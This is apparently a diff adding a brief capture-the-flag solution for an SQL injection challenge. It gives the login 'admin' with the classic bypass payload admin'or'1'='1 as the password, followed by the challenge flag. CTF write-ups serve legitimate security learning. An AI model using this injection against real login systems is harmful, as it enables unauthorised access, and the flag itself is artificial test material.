@@ -1,0 +1,8 @@
+SQL injection challenge
+
+simply input 
+username: admin
+password: admin'or'1'='1
+
+
+flag: nactf{sQllllllll_1m5qpr8x}
